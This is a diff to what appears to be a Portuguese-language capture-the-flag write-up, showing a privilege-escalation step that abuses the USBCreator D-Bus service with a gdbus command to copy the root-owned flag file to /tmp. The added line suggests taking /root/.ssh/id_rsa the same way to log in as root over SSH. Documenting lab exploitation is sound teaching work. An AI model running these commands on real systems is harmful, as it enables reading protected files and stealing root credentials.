@@ -490,11 +490,11 @@ uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(
 ```
 
 Portanto, podemos ler o arquivo root.txt, mandando seu conteúdo para um arquivo vazio na pasta /tmp.
-
+> Obs: Caso queira realizar o login, basta pegar o arquivo /root/.ssh/id_rsa e usar a chave pública para realizar o login via ssh como root
 ```terminal
 $ touch /tmp/flag
 $ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/flag true
-<all --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCrea<untu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.US<ath /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.< --method com.ubuntu.USBCreator.Image `/root/root.txt` `/tmp/flag` true
+<all --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCrea<untu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.US<ath /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.< --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/flag true
 ()
 $ cat /tmp/flag
 ~flag root~
